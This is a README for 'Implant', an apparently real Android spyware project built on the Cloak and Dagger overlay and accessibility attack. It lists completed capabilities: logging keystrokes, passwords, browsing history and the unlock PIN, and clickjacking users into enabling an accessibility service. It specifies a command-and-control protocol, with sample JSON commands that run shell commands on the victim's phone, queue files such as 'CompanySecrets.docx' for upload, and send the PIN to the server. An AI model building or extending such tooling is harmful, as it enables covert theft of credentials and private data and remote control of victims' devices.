Cloak and Dagger Implementation
===============================
Implant is an (unfinished) implementation of the Android Clock and Dagger vulnerability in Kotlin.
To learn more about Cloak and Dagger see, http://cloak-and-dagger.org.

If the overlays do not display correctly on your phone, adjust the overlay dimensions in the
relevant Stage subclasses.
Currently only the AccessibilityStage of the attack automatically determines the position of the
UI elements being clickjacked.

You can contact me at cooper@cooperthecoder.com.
Pull requests, questions, suggestions and criticism are welcomed.


Requirements
============
+ Android Studio with Kotlin support (3.0+ or with Kotlin plugin)

Installing Implant
==================
To install Implant, import this code into a version of Android Studio with Kotlin support.
Since Android only grants the SYSTEM_ALERT_WINDOW permission to apps from the Play Store, you'll
have to manually enable the permission and press the back button to begin the attack, or publish
it to the Play Store.
Implant uses coloured translucent overlays to show exactly what is going on in the background.
Simply click the holes in the overlay to progress the attack.

Supported Devices
-----------------
+ Nexus 5X Nougat
+ Nexus 5X Marshmallow
+ Nexus 4 Lollipop

Accessibility Service Capabilities
==================================
Done
----
+ Log non-password keystrokes
+ Log browser history
+ Log selected text
+ Log applications used
+ Log Security Pin
+ Log password keystrokes

To Do
-----
+ Install additional payload from an APK

Overlay Capabilities
====================
Done
----
+ Determine the position of our AccessibilityService in the Settings Menu dynamically
+ Clickjacking -> a11y working on some screen sizes

To Do
-----
+ Determine the location of all clickjacking targets dynamically

Command and Control
===================
Implant uses push notifications in order to receive commands from the C&C.
This will enable the operator to interact with devices under her control in a chat-like
manner.
To avoid finishing the victim's mobile data allowance, no large payloads are transmitted
on mobile connections.
Instead, payloads are sent via push as URLs and added to a queue locally to be
downloaded when the victim connects to an unmetered Wi-Fi network.
Large uploads are handled similarly.
When an upload command is sent via push, the data will be encrypted using the server's
public key and queued for upload when the victim connects to Wi-Fi.

Supported Operations
--------------------
+ Queue files for upload when device is idle and connected to Wi-Fi
+ Execute shell commands from the C&C

Push Service
------------
The CommandService is started whenever the device is idle and connected to an
unmetered network.
It opens a Websocket connection to the C&C and listens for commands.
On startup, the client signals it is ready to receive commands by sending its unique
Android device ID.
When the user disconnects from the unmetered network, this service should stop
immediately and close the socket.
All messages between client and server represent remote function calls.

#####Message Format
Key | Type | Description
----|------|----------------
command | String | The function to be called on the remote end.
arguments | Map(String -> String) | Arguments to be passed to the function.
nonce | String | A unique ID to allow for tracking of command execution. The nonce does not have to be random but must be unique

#####Execute
The `execute` command allows the server to execute a shell command on the device.
```
{
    "command": "execute",
    "nonce": "1234-5467-4353-6468"
    "arguments": {
        "shell_command": "whoami"
    }
}
```

#####Upload
The `upload` command allows the server to queue a file on the device for uploading when the device
is idle and connected to an unmetered network.
```
{
    "command": "upload",
    "nonce": "1234-5467-4353-1359"
    "arguments": {
        "filename": "/sdcard/Documents/CompanySecrets.docx"
    }
}
```

#####Pin
The `pin` command sends the device's unlock PIN to the server.
```
{
    "command": "pin",
    "nonce": "1234-5467-4353-1234"
    "arguments": {}
}
```

#####Reply
Sometimes, the output of a command is useful.
The `reply` command should be used to send a reply to the server.
Since there is no guarantee that commands will execute in order, the nonce should be used to
track which command the response is for.
```
{
    "command": "reply"
    "nonce": "1234-5467-4312-0987"
    "arguments": {
        "command": "1234-5467-4353-1359",
        "output": "/sdcard/Documents/CompanySecrets.docx queued for upload.",
        "error": ""
    }
}
```

Disclaimer
==========
I am not responsible for anything illegal, immoral or stupid you do with this code.
Please use it for educational purposes only.